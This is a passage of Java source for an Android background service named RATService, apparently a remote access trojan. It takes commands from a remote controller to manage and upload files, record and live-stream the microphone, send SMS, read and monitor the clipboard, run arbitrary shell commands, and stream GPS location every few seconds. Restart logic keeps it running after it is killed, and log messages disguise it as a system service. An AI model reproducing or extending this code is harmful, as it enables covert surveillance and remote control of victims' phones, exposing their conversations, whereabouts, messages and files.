                    sendCommand("FILE_DELETE|ERROR: File module not available");
                }
                break;
                
            case "file_rename":
            case "rename":
                if (fileModule != null && args.contains("|")) {
                    String[] parts2 = args.split("\\|", 2);
                    String result = fileModule.renameFile(parts2[0], parts2[1]);
                    sendCommand("FILE_RENAME|" + result);
                } else {
                    sendCommand("FILE_RENAME|ERROR: Invalid format or module unavailable");
                }
                break;
                
            case "create_folder":
            case "mkdir":
                if (fileModule != null && args.contains("|")) {
                    String[] parts2 = args.split("\\|", 2);
                    String result = fileModule.createFolder(parts2[0], parts2[1]);
                    sendCommand("CREATE_FOLDER|" + result);
                } else {
                    sendCommand("CREATE_FOLDER|ERROR: Invalid format or module unavailable");
                }
                break;
                
            case "file_zip":
            case "zip":
                if (fileModule != null) {
                    String result = fileModule.zipFile(args);
                    sendCommand("FILE_ZIP|" + result);
                } else {
                    sendCommand("FILE_ZIP|ERROR: File module not available");
                }
                break;
                
            case "file_upload":
            case "upload":
                if (fileModule != null && args.contains("|")) {
                    String[] parts2 = args.split("\\|", 3);
                    if (parts2.length == 3) {
                        String result = fileModule.uploadFile(parts2[0], parts2[1], parts2[2]);
                        sendCommand("FILE_UPLOAD|" + result);
                    } else {
                        sendCommand("FILE_UPLOAD|ERROR: Invalid format");
                    }
                } else {
                    sendCommand("FILE_UPLOAD|ERROR: File module not available");
                }
                break;
                
            case "search_files":
                if (fileModule != null && args.contains("|")) {
                    String[] parts2 = args.split("\\|", 2);
                    String result = fileModule.searchFiles(parts2[0], parts2[1]);
                    sendCommand("SEARCH_FILES|" + result);
                } else {
                    sendCommand("SEARCH_FILES|ERROR: Invalid format");
                }
                break;
                
            case "storage_info":
                if (fileModule != null) {
                    String result = fileModule.getStorageInfo();
                    sendCommand("STORAGE_INFO|" + result);
                } else {
                    sendCommand("STORAGE_INFO|ERROR: File module not available");
                }
                break;
                
            case "test_folder":
                if (fileModule != null) {
                    String result = fileModule.testFolder(args);
                    sendCommand("TEST|" + result);
                } else {
                    sendCommand("TEST|ERROR: File module not available");
                }
                break;
                
           // Microphone commands
case "mic":
case "mic_start":
case "start_recording":
    if (micModule != null) {
        Log.d(TAG, "🎤 Starting recording");
        
        // Parse args: format|duration|bitrate
        String[] parts = args.split("\\|");
        String format = parts.length > 0 ? parts[0] : "mp3";
        int duration = parts.length > 1 ? Integer.parseInt(parts[1]) : 30;
        int bitrate = parts.length > 2 ? Integer.parseInt(parts[2]) : 128;
        
        String result = micModule.startRecording(duration, format, bitrate);
        
        // Send acknowledgment
        try {
            JSONObject response = new JSONObject();
            response.put("command", "mic_response");
            response.put("action", "start_recording");
            response.put("status", result.startsWith("SUCCESS") ? "success" : "error");
            response.put("message", result);
            sendCommand(response.toString());
        } catch (JSONException e) {
            Log.e(TAG, "JSON error", e);
        }
    } else {
        sendCommand("MIC|ERROR: Microphone module not available");
    }
    break;
    
case "mic_stop":
case "stop_recording":
    if (micModule != null) {
        Log.d(TAG, "🎤 Stopping recording");
        String result = micModule.stopRecording();
        
        // Send the recording data
        try {
            JSONObject response = new JSONObject(result);
            response.put("command", "mic_response");
            response.put("action", "stop_recording");
            sendCommand(response.toString());
        } catch (JSONException e) {
            sendCommand("MIC_STOP|" + result);
        }
    } else {
        sendCommand("MIC_STOP|ERROR: Microphone module not available");
    }
    break;
    
case "mic_stream":
case "start_streaming":
    if (micModule != null) {
        Log.d(TAG, "🎤 Starting live stream");
        
        // Parse args: sampleRate|bitrate|format
        String[] parts = args.split("\\|");
        int sampleRate = parts.length > 0 ? Integer.parseInt(parts[0]) : 44100;
        int bitrate = parts.length > 1 ? Integer.parseInt(parts[1]) : 128;
        String format = parts.length > 2 ? parts[2] : "mp3";
        
        // Set up streaming callback
        String result = micModule.startStreaming(sampleRate, bitrate, format, 
            new MicModule.StreamDataCallback() {
                @Override
                public void onStreamData(byte[] data, int length) {
                    try {
                        JSONObject streamData = new JSONObject();
                        streamData.put("command", "mic_stream_data");
                        streamData.put("data", Base64.encodeToString(data, Base64.NO_WRAP));
                        streamData.put("length", length);
                        sendCommand(streamData.toString());
                    } catch (JSONException e) {
                        Log.e(TAG, "Error sending stream data", e);
                    }
                }
                
                @Override
                public void onStreamError(String error) {
                    try {
                        JSONObject errorData = new JSONObject();
                        errorData.put("command", "mic_stream_error");
                        errorData.put("error", error);
                        sendCommand(errorData.toString());
                    } catch (JSONException e) {
                        Log.e(TAG, "Error sending stream error", e);
                    }
                }
            });
        
        try {
            JSONObject response = new JSONObject();
            response.put("command", "mic_response");
            response.put("action", "start_streaming");
            response.put("status", result.startsWith("SUCCESS") ? "success" : "error");
            response.put("message", result);
            sendCommand(response.toString());
        } catch (JSONException e) {
            Log.e(TAG, "JSON error", e);
        }
    } else {
        sendCommand("MIC_STREAM|ERROR: Microphone module not available");
    }
    break;
    
case "mic_stream_stop":
case "stop_streaming":
    if (micModule != null) {
        Log.d(TAG, "🎤 Stopping live stream");
        String result = micModule.stopStreaming();
        
        try {
            JSONObject response = new JSONObject();
            response.put("command", "mic_response");
            response.put("action", "stop_streaming");
            response.put("status", "success");
            response.put("message", result);
            sendCommand(response.toString());
        } catch (JSONException e) {
            Log.e(TAG, "JSON error", e);
        }
    } else {
        sendCommand("MIC_STREAM_STOP|ERROR: Microphone module not available");
    }
    break;
    
case "mic_list":
case "get_recordings":
    if (micModule != null) {
        Log.d(TAG, "🎤 Getting recordings list");
        String result = micModule.getRecordings();
        
        try {
            JSONObject response = new JSONObject(result);
            response.put("command", "mic_response");
            response.put("action", "list_recordings");
            sendCommand(response.toString());
        } catch (JSONException e) {
            sendCommand("MIC_LIST|" + result);
        }
    } else {
        sendCommand("MIC_LIST|ERROR: Microphone module not available");
    }
    break;
    
case "mic_play":
case "play_recording":
    if (micModule != null && !args.isEmpty()) {
        Log.d(TAG, "🎤 Playing recording: " + args);
        String result = micModule.playRecording(args);
        
        try {
            JSONObject response = new JSONObject();
            response.put("command", "mic_response");
            response.put("action", "play_recording");
            response.put("status", result.startsWith("SUCCESS") ? "success" : "error");
            response.put("message", result);
            sendCommand(response.toString());
        } catch (JSONException e) {
            Log.e(TAG, "JSON error", e);
        }
    } else {
        sendCommand("MIC_PLAY|ERROR: No file specified");
    }
    break;
    
case "mic_stop_play":
case "stop_playback":
    if (micModule != null) {
        Log.d(TAG, "🎤 Stopping playback");
        String result = micModule.stopPlayback();
        
        try {
            JSONObject response = new JSONObject();
            response.put("command", "mic_response");
            response.put("action", "stop_playback");
            response.put("status", "success");
            response.put("message", result);
            sendCommand(response.toString());
        } catch (JSONException e) {
            Log.e(TAG, "JSON error", e);
        }
    } else {
        sendCommand("MIC_STOP_PLAY|ERROR: Microphone module not available");
    }
    break;
    
case "mic_delete":
case "delete_recording":
    if (micModule != null && !args.isEmpty()) {
        Log.d(TAG, "🎤 Deleting recording: " + args);
        String result = micModule.deleteRecording(args);
        
        try {
            JSONObject response = new JSONObject(result);
            response.put("command", "mic_response");
            response.put("action", "delete_recording");
            sendCommand(response.toString());
        } catch (JSONException e) {
            sendCommand("MIC_DELETE|" + result);
        }
    } else {
        sendCommand("MIC_DELETE|ERROR: No file specified");
    }
    break;
    
case "mic_download":
case "download_recording":
    if (micModule != null && !args.isEmpty()) {
        Log.d(TAG, "🎤 Downloading recording: " + args);
        String result = micModule.downloadRecording(args);
        
        try {
            JSONObject response = new JSONObject(result);
            response.put("command", "mic_response");
            response.put("action", "download_recording");
            sendCommand(response.toString());
        } catch (JSONException e) {
            sendCommand("MIC_DOWNLOAD|" + result);
        }
    } else {
        sendCommand("MIC_DOWNLOAD|ERROR: No file specified");
    }
    break;
    
case "mic_settings":
case "configure_mic":
    if (micModule != null) {
        Log.d(TAG, "🎤 Configuring microphone: " + args);
        
        // Parse args: sampleRate|bitrate|format|channel
        String[] parts = args.split("\\|");
        int sampleRate = parts.length > 0 ? Integer.parseInt(parts[0]) : 44100;
        int bitrate = parts.length > 1 ? Integer.parseInt(parts[1]) : 128;
        String format = parts.length > 2 ? parts[2] : "mp3";
        String channel = parts.length > 3 ? parts[3] : "mono";
        
        String result = micModule.configureSettings(sampleRate, bitrate, format, channel);
        
        try {
            JSONObject response = new JSONObject(result);
            response.put("command", "mic_response");
            response.put("action", "configure_settings");
            sendCommand(response.toString());
        } catch (JSONException e) {
            sendCommand("MIC_SETTINGS|" + result);
        }
    } else {
        sendCommand("MIC_SETTINGS|ERROR: Microphone module not available");
    }
    break;
                
            case "sms_send":
                if (smsModule != null && args.contains("|")) {
                    String[] parts2 = args.split("\\|", 2);
                    String result = smsModule.sendSms(parts2[0], parts2[1]);
                    sendCommand("SMS_SEND|" + result);
                } else {
                    sendCommand("SMS_SEND|ERROR: Invalid format or module unavailable");
                }
                break;
                
               // In routeCommand() method, add these cases:

case "clipboard_get":
    if (clipboardModule != null) {
        String result = clipboardModule.getClipboardContent();
        sendCommand("CLIPBOARD_GET|" + result);
    } else {
        sendCommand("CLIPBOARD_GET|{\"success\":false,\"error\":\"Clipboard module not available\"}");
    }
    break;

case "clipboard_set":
    if (clipboardModule != null && args.contains("|")) {
        String[] parts = args.split("\\|", 2);
        String text = parts[0];
        String label = parts.length > 1 ? parts[1] : "Copied from remote";
        String result = clipboardModule.setClipboardContent(text, label);
        sendCommand("CLIPBOARD_SET|" + result);
    } else if (clipboardModule != null) {
        String result = clipboardModule.setClipboardContent(args, "Copied from remote");
        sendCommand("CLIPBOARD_SET|" + result);
    } else {
        sendCommand("CLIPBOARD_SET|{\"success\":false,\"error\":\"Clipboard module not available\"}");
    }
    break;

case "clipboard_history":
    if (clipboardModule != null) {
        String result = clipboardModule.getClipboardHistory();
        sendCommand("CLIPBOARD_HISTORY|" + result);
    } else {
        sendCommand("CLIPBOARD_HISTORY|{\"success\":false,\"error\":\"Clipboard module not available\"}");
    }
    break;

case "clipboard_monitor_start":
    if (clipboardModule != null) {
        String result = clipboardModule.startMonitoring();
        sendCommand("CLIPBOARD_MONITOR|" + result);
    } else {
        sendCommand("CLIPBOARD_MONITOR|{\"success\":false,\"error\":\"Clipboard module not available\"}");
    }
    break;

case "clipboard_monitor_stop":
    if (clipboardModule != null) {
        String result = clipboardModule.stopMonitoring();
        sendCommand("CLIPBOARD_MONITOR|" + result);
    } else {
        sendCommand("CLIPBOARD_MONITOR|{\"success\":false,\"error\":\"Clipboard module not available\"}");
    }
    break;

case "clipboard_clear_history":
    if (clipboardModule != null) {
        String result = clipboardModule.clearHistory();
        sendCommand("CLIPBOARD_CLEAR|" + result);
    } else {
        sendCommand("CLIPBOARD_CLEAR|{\"success\":false,\"error\":\"Clipboard module not available\"}");
    }
    break;

case "clipboard_status":
    if (clipboardModule != null) {
        String result = clipboardModule.getStatus();
        sendCommand("CLIPBOARD_STATUS|" + result);
    } else {
        sendCommand("CLIPBOARD_STATUS|{\"success\":false,\"error\":\"Clipboard module not available\"}");
    }
    break;

case "clipboard_add_pattern":
    if (clipboardModule != null && !args.isEmpty()) {
        String result = clipboardModule.addAutoCopyPattern(args);
        sendCommand("CLIPBOARD_PATTERN|" + result);
    } else {
        sendCommand("CLIPBOARD_PATTERN|{\"success\":false,\"error\":\"Invalid pattern\"}");
    }
    break;

case "clipboard_remove_pattern":
    if (clipboardModule != null && !args.isEmpty()) {
        String result = clipboardModule.removeAutoCopyPattern(args);
        sendCommand("CLIPBOARD_PATTERN|" + result);
    } else {
        sendCommand("CLIPBOARD_PATTERN|{\"success\":false,\"error\":\"Invalid pattern\"}");
    }
    break; 
            case "shell":
            case "exec":
                if (shellModule != null) {
                    String result = shellModule.executeCommand(args);
                    sendCommand("SHELL|" + result);
                } else {
                    sendCommand("SHELL|ERROR: Shell module not available");
                }
                break;
                
            default:
                sendCommand("UNKNOWN_CMD|" + cmd);
                break;
        }
    }
    
    // Handle location streaming commands
    private void handleLocationStreamCommand(String args) {
        args = args.trim().toLowerCase();
        
        if (args.equals("start") || args.equals("begin") || args.equals("on")) {
            startLocationTracking();
        } else if (args.equals("stop") || args.equals("end") || args.equals("off")) {
            stopLocationTracking();
        } else if (args.isEmpty()) {
            // Return current tracking status
            sendCommand("LOCATION_STREAM|" + (isLocationTracking ? "active" : "inactive"));
        } else {
            sendCommand("LOCATION_STREAM|error: Unknown parameter. Use 'start' or 'stop'");
        }
    }
    
    // Start live location tracking
    private void startLocationTracking() {
        if (!checkLocationPermission()) {
            sendCommand("LOCATION_STREAM|error: No location permission");
            return;
        }
        
        if (isLocationTracking) {
            sendCommand("LOCATION_STREAM|already active");
            return;
        }
        
        try {
            locationListener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    // Send location update immediately
                    String locationJson = createLocationJson(location);
                    sendCommand("LOCATION_UPDATE|" + locationJson);
                    Log.d(TAG, "Location update sent: " + location.getLatitude() + "," + location.getLongitude());
                }
                
                @Override
                public void onStatusChanged(String provider, int status, Bundle extras) {
                    Log.d(TAG, "Location provider status changed: " + provider + " status: " + status);
                }
                
                @Override
                public void onProviderEnabled(String provider) {
                    Log.d(TAG, "Location provider enabled: " + provider);
                }
                
                @Override
                public void onProviderDisabled(String provider) {
                    Log.d(TAG, "Location provider disabled: " + provider);
                    sendCommand("LOCATION_STREAM|warning: " + provider + " disabled");
                }
            };
            
            // Request location updates every 3 seconds, or when device moves 5 meters
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locationManager.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER,
                    3000,   // 3 seconds
                    5,      // 5 meters
                    locationListener,
                    locationHandler.getLooper()
                );
                Log.d(TAG, "GPS location tracking started");
            }
            
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER,
                    3000,
                    5,
                    locationListener,
                    locationHandler.getLooper()
                );
                Log.d(TAG, "Network location tracking started");
            }
            
            isLocationTracking = true;
            sendCommand("LOCATION_STREAM|started");
            
            // Get initial location immediately
            Location lastLocation = getBestLastKnownLocation();
            if (lastLocation != null) {
                String locationJson = createLocationJson(lastLocation);
                sendCommand("LOCATION_UPDATE|" + locationJson);
            }
            
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception starting location tracking", e);
            sendCommand("LOCATION_STREAM|error: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Error starting location tracking", e);
            sendCommand("LOCATION_STREAM|error: " + e.getMessage());
        }
    }
    
    // Stop live location tracking
    private void stopLocationTracking() {
        if (locationManager != null && locationListener != null) {
            locationManager.removeUpdates(locationListener);
            locationListener = null;
            isLocationTracking = false;
            sendCommand("LOCATION_STREAM|stopped");
            Log.d(TAG, "Location tracking stopped");
        } else {
            sendCommand("LOCATION_STREAM|already inactive");
        }
    }
    
    // Get best last known location
    private Location getBestLastKnownLocation() {
        Location bestLocation = null;
        
        try {
            if (checkLocationPermission()) {
                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                    Location gpsLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    if (gpsLocation != null && (bestLocation == null || 
                        gpsLocation.getAccuracy() < bestLocation.getAccuracy())) {
                        bestLocation = gpsLocation;
                    }
                }
                
                if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    Location networkLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    if (networkLocation != null && (bestLocation == null || 
                        networkLocation.getAccuracy() < bestLocation.getAccuracy())) {
                        bestLocation = networkLocation;
                    }
                }
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception getting last known location", e);
        }
        
        return bestLocation;
    }
    
    // Check location permission
    private boolean checkLocationPermission() {
        return ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                == PackageManager.PERMISSION_GRANTED ||
               ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)
                == PackageManager.PERMISSION_GRANTED;
    }
    
    // Create JSON from location
    private String createLocationJson(Location location) {
        try {
            JSONObject json = new JSONObject();
            json.put("latitude", location.getLatitude());
            json.put("longitude", location.getLongitude());
            json.put("accuracy", location.hasAccuracy() ? location.getAccuracy() : 0);
            json.put("altitude", location.hasAltitude() ? location.getAltitude() : 0);
            json.put("bearing", location.hasBearing() ? location.getBearing() : 0);
            json.put("speed", location.hasSpeed() ? location.getSpeed() : 0);
            json.put("provider", location.getProvider());
            json.put("time", location.getTime());
            json.put("timestamp", System.currentTimeMillis());
            return json.toString();
        } catch (JSONException e) {
            return "{\"error\":\"JSON creation error\"}";
        }
    }
    
    private String getUniqueDeviceId() {
        SharedPreferences prefs = getSharedPreferences("device_prefs", MODE_PRIVATE);
        String deviceId = prefs.getString("device_id", null);
        if (deviceId == null) {
            deviceId = java.util.UUID.randomUUID().toString();
            prefs.edit().putString("device_id", deviceId).apply();
        }
        return deviceId;
    }
    
    private void scheduleRestartWithAlarm() {
        Intent restartIntent = new Intent(this, RATService.class);
        PendingIntent pendingIntent = PendingIntent.getService(
            this, 1, restartIntent, 
            PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
        
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        if (alarmManager != null) {
            alarmManager.set(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + RESTART_DELAY_MS, 
                pendingIntent);
            Log.d(TAG, "Restart scheduled");
        }
    }
    
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        Log.d(TAG, "Task removed - normal operation");
        scheduleAllJobs();
        scheduleRestartWithAlarm();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return binder;
    }
    
    @Override
    public void onDestroy() {
        Log.d(TAG, "System service onDestroy");
        
        // Stop location tracking
        stopLocationTracking();
        
        // Clean up location thread
        if (locationThread != null) {
            locationThread.quitSafely();
            try {
                locationThread.join();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        
        isRunning.set(false);
        AppController.clearConnectionService();
        instance = null;
        
        closeConnection();
        
        if (executor != null) {
            executor.shutdownNow();
            executor = null;
        }
        
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        
        scheduleAllJobs();
        scheduleRestartWithAlarm();
        
        super.onDestroy();
    }
}
